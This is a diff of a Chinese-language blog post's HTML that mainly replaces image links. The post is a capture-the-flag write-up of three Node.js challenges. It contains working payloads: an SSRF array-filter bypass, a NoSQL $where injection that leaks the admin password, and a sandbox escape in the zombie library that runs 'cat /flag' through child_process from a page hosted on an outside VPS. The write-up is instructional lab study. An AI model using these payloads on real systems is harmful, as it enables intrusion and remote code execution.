@@ -244,30 +244,30 @@
 <li>判断用户名是否为superuser，是的话就退出</li>
 <li>DB.getFile从files表中获取filename字段，然后拼接在<code>../files/</code>后面，最后读取拼接后的文件名</li>
 </ol>
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210908205604921.png" srcset="/img/loading.gif" lazyload alt="image-20210908205604921"></p>
+<p><a href="https://imgtu.com/i/4hdlNj"><img src="https://z3.ax1x.com/2021/09/29/4hdlNj.png" srcset="/img/loading.gif" lazyload alt="4hdlNj.png"></a></p>
 <p>getFile</p>
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210908213831406.png" srcset="/img/loading.gif" lazyload alt="image-20210908213831406"></p>
+<p><a href="https://imgtu.com/i/4hdKHg"><img src="https://z3.ax1x.com/2021/09/29/4hdKHg.png" srcset="/img/loading.gif" lazyload alt="4hdKHg.png"></a></p>
 <p>Create</p>
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210908213846055.png" srcset="/img/loading.gif" lazyload alt="image-20210908213846055"></p>
+<p><a href="https://imgtu.com/i/4hduDS"><img src="https://z3.ax1x.com/2021/09/29/4hduDS.png" srcset="/img/loading.gif" lazyload alt="4hduDS.png"></a></p>
 <p>/admin</p>
 <p>将html代码转换成pdf，过滤了<code>&lt; &gt; / script on</code>，可以用数组绕过，触发ssrf</p>
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210908210805906.png" srcset="/img/loading.gif" lazyload alt="image-20210908210805906"></p>
+<p><a href="https://imgtu.com/i/4hdQEQ"><img src="https://z3.ax1x.com/2021/09/29/4hdQEQ.png" srcset="/img/loading.gif" lazyload alt="4hdQEQ.png"></a></p>
 <p>files表的结构</p>
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210908215028738.png" srcset="/img/loading.gif" lazyload alt="image-20210908215028738"></p>
+<p><a href="https://imgtu.com/i/4hdnu8"><img src="https://z3.ax1x.com/2021/09/29/4hdnu8.png" srcset="/img/loading.gif" lazyload alt="4hdnu8.png"></a></p>
 <h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>用硬编码的用户密码登录</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">admin</span>:e<span class="hljs-number">365655</span>e<span class="hljs-number">013</span>ce<span class="hljs-number">7</span>fdbdbf<span class="hljs-number">8</span>f<span class="hljs-number">27</span>b<span class="hljs-number">418</span>c<span class="hljs-number">8</span>fe<span class="hljs-number">6</span>dc<span class="hljs-number">9354</span>dc<span class="hljs-number">4</span>c<span class="hljs-number">0328</span>fa<span class="hljs-number">02</span>b<span class="hljs-number">0</span>ea<span class="hljs-number">547659645</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210909091612485.png" srcset="/img/loading.gif" lazyload alt="image-20210909091612485"></p>
+<p><a href="https://imgtu.com/i/4hdJg0"><img src="https://z3.ax1x.com/2021/09/29/4hdJg0.png" srcset="/img/loading.gif" lazyload alt="4hdJg0.png"></a></p>
 <p>请求</p>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">content[]=<span class="hljs-params">&lt;img src=&quot;http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8888</span>/api/files?username=admin<span class="hljs-variable">&amp;filename</span>=./flag<span class="hljs-variable">&amp;checksum</span>=<span class="hljs-number">123</span>&quot;&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210909091445062.png" srcset="/img/loading.gif" lazyload alt="image-20210909091445062"></p>
+<p><a href="https://imgtu.com/i/4hdG3q"><img src="https://z3.ax1x.com/2021/09/29/4hdG3q.png" srcset="/img/loading.gif" lazyload alt="4hdG3q.png"></a></p>
 <p>访问</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">88602</span>e<span class="hljs-number">43</span>-f<span class="hljs-number">55</span>f-<span class="hljs-number">44</span>ac-b<span class="hljs-number">03</span>c-<span class="hljs-number">5</span>c<span class="hljs-number">54356</span>a<span class="hljs-number">2</span>b<span class="hljs-number">1</span>e.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/api/files/<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210909091529672.png" srcset="/img/loading.gif" lazyload alt="image-20210909091529672"></p>
+<p><a href="https://imgtu.com/i/4hd8Cn"><img src="https://z3.ax1x.com/2021/09/29/4hd8Cn.png" srcset="/img/loading.gif" lazyload alt="4hd8Cn.png"></a></p>
 <p>得到flag</p>
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210909091408495.png" srcset="/img/loading.gif" lazyload alt="image-20210909091408495"></p>
+<p><a href="https://imgtu.com/i/4hd14s"><img src="https://z3.ax1x.com/2021/09/29/4hd14s.png" srcset="/img/loading.gif" lazyload alt="4hd14s.png"></a></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学到的知识：</p>
 <ol>
 <li>js数组绕过内容过滤</li>
@@ -281,7 +281,7 @@
 <li>/auth</li>
 </ol>
 <p>/auth这里有sql注入，$where存在Nosql注入</p>
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210915203317694.png" srcset="/img/loading.gif" lazyload alt="image-20210915203317694"></p>
+<p><a href="https://imgtu.com/i/4hdygx"><img src="https://z3.ax1x.com/2021/09/29/4hdygx.png" srcset="/img/loading.gif" lazyload alt="4hdygx.png"></a></p>
 <p>再看/routes/package.ts中的路由：</p>
 <ol>
 <li>/       判断用户名是否为testuser</li>
@@ -302,46 +302,46 @@
 <p>拼接后完整的payload，分析可以知道， || 前面不管，后面会直接把admin密码的错误异常抛出，就会直接抛出密码，登录即可得到flag</p>
 <figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">this</span>.username == <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; hex_md5(<span class="hljs-built_in">this</span>.password) ==<span class="hljs-string">&quot; e10adc3949ba59abbe56e057f20f883e&quot;</span> || (<span class="hljs-function"><span class="hljs-params">()</span>=&gt;</span>&#123;<span class="hljs-keyword">throw</span> <span class="hljs-built_in">Error</span>(<span class="hljs-built_in">this</span>.password)&#125;)() == <span class="hljs-string">&quot;admin &quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210916152932626.png" srcset="/img/loading.gif" lazyload alt="image-20210916152932626"></p>
+<p><a href="https://imgtu.com/i/4hd6v6"><img src="https://z3.ax1x.com/2021/09/29/4hd6v6.png" srcset="/img/loading.gif" lazyload alt="4hd6v6.png"></a></p>
 <p>登录进去得到flag</p>
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210916153136634.png" srcset="/img/loading.gif" lazyload alt="image-20210916153136634"></p>
+<p><a href="https://imgtu.com/i/4hdgKK"><img src="https://z3.ax1x.com/2021/09/29/4hdgKK.png" srcset="/img/loading.gif" lazyload alt="4hdgKK.png"></a></p>
 <p>还可以使用盲注的方法</p>
 <h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ol>
 <li>Nosql注入</li>
 </ol>
 <h1 id="crawler-z"><a href="#crawler-z" class="headerlink" title="crawler_z"></a>crawler_z</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>注册用户后登录，发现可以输入Bucket</p>
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210910082034316.png" srcset="/img/loading.gif" lazyload alt="image-20210910082034316"></p>
+<p><a href="https://imgtu.com/i/4hdYvV"><img src="https://z3.ax1x.com/2021/09/29/4hdYvV.png" srcset="/img/loading.gif" lazyload alt="4hdYvV.png"></a></p>
 <p>/user/bucket</p>
 <p><code>/bucket</code>路由实例化了Crawler类，而Crawler类的构造方法中又实例化了zombie库，存在代码执行漏洞，只要访问的url可控就可以执行代码。</p>
 <p>url来源于<code>user.bucket</code>，而且经过了正则判断，结尾必须是<code>oss-cn-beijing.ichunqiu.com</code></p>
 <p>现在的目标就是把<code>user.bucket</code>改成我们的payload地址</p>
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210910173126996.png" srcset="/img/loading.gif" lazyload alt="image-20210910173126996"></p>
+<p><a href="https://imgtu.com/i/4hdrCR"><img src="https://z3.ax1x.com/2021/09/29/4hdrCR.png" srcset="/img/loading.gif" lazyload alt="4hdrCR.png"></a></p>
 <p>/user/profile</p>
 <p>寻找<code>user.bucket</code>的来源，发现来源于<code>/user/profile</code>输入的bucket</p>
 <p>跳转到<code>/user/veridy?token=$&#123;authToken&#125;</code>，authToken是随机生成的</p>
 <p><code>checkBucket</code>函数监测内容是否为http或者https开头，内容是否包含<code>oss-cn-beijing.ichunqiu.com</code></p>
 <p>如果输入的bucket不满足判断，就无法得到token，也就没办法修改bucket；但由于这里的update会保存输入的bucket，所以可以先输入一个正常的bucket来获取token，同时选择不跳转到<code>/user/verify</code>，然后输入恶意bucket再利用之前生成的token跳转到<code>/user/verify</code>，这样就成功保存了恶意bucket</p>
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210910201730377.png" srcset="/img/loading.gif" lazyload alt="image-20210910201730377"></p>
+<p><a href="https://imgtu.com/i/4hds81"><img src="https://z3.ax1x.com/2021/09/29/4hds81.png" srcset="/img/loading.gif" lazyload alt="4hds81.png"></a></p>
 <p>/user/verify</p>
 <p><code>/verify</code>这里会对输入的token跟保存的token进行对比，一致的话就可以成功修改<code>user.bucket</code></p>
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210910175113213.png" srcset="/img/loading.gif" lazyload alt="image-20210910175113213"></p>
+<p><a href="https://imgtu.com/i/4hdB59"><img src="https://z3.ax1x.com/2021/09/29/4hdB59.png" srcset="/img/loading.gif" lazyload alt="4hdB59.png"></a></p>
 <h2 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h2><p>利用zombie库的代码注入漏洞，在vps上放一个payload.html，payload.html内容</p>
 <figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">&lt;script&gt;<br>a=<span class="hljs-keyword">this</span>.<span class="hljs-keyword">constructor</span>.<span class="hljs-keyword">constructor</span>.<span class="hljs-keyword">constructor</span>.<span class="hljs-keyword">constructor</span>(<span class="hljs-string">&#x27;return process&#x27;</span>)();b=a.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>);c=b.execSync(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).toString();document.write(c);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 
 
 
 <p>注册用户后登录，访问/user/profile输入Age后Update，然后burp抓包</p>
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210910170524783.png" srcset="/img/loading.gif" lazyload alt="image-20210910170524783"></p>
+<p><a href="https://imgtu.com/i/4hdUDU"><img src="https://z3.ax1x.com/2021/09/29/4hdUDU.png" srcset="/img/loading.gif" lazyload alt="4hdUDU.png"></a></p>
 <p>接下来发送两次数据包，第一次发送满足正则的bucket，获取token但是不跟随跳转</p>
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210910170730664.png" srcset="/img/loading.gif" lazyload alt="image-20210910170730664"></p>
+<p><a href="https://imgtu.com/i/4hdNuT"><img src="https://z3.ax1x.com/2021/09/29/4hdNuT.png" srcset="/img/loading.gif" lazyload alt="4hdNuT.png"></a></p>
 <p>第二次更新恶意bucket，修改bucket为</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">118.195</span>.<span class="hljs-number">166.138</span><span class="hljs-regexp">/payload.html#oss-cn-beijing.ichunqiu.com/</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210910171201938.png" srcset="/img/loading.gif" lazyload alt="image-20210910171201938"></p>
+<p><a href="https://imgtu.com/i/4hdwE4"><img src="https://z3.ax1x.com/2021/09/29/4hdwE4.png" srcset="/img/loading.gif" lazyload alt="4hdwE4.png"></a></p>
 <p>然后回到第一个数据包，选择Follow Direction，带上token访问进入</p>
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210910171226965.png" srcset="/img/loading.gif" lazyload alt="image-20210910171226965"></p>
+<p><a href="https://imgtu.com/i/4hd0UJ"><img src="https://z3.ax1x.com/2021/09/29/4hd0UJ.png" srcset="/img/loading.gif" lazyload alt="4hd0UJ.png"></a></p>
 <p>访问/user/bucket得到flag</p>
-<p><img src="%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%89%E9%81%93nodejs%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0.assets/image-20210910171805935.png" srcset="/img/loading.gif" lazyload alt="image-20210910171805935"></p>
+<p><a href="https://imgtu.com/i/4hdabF"><img src="https://z3.ax1x.com/2021/09/29/4hdabF.png" srcset="/img/loading.gif" lazyload alt="4hdabF.png"></a></p>
 <h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><ol>
 <li>先满足正则获取token，但不跟随跳转，</li>
 <li>输入恶意bucket</li>
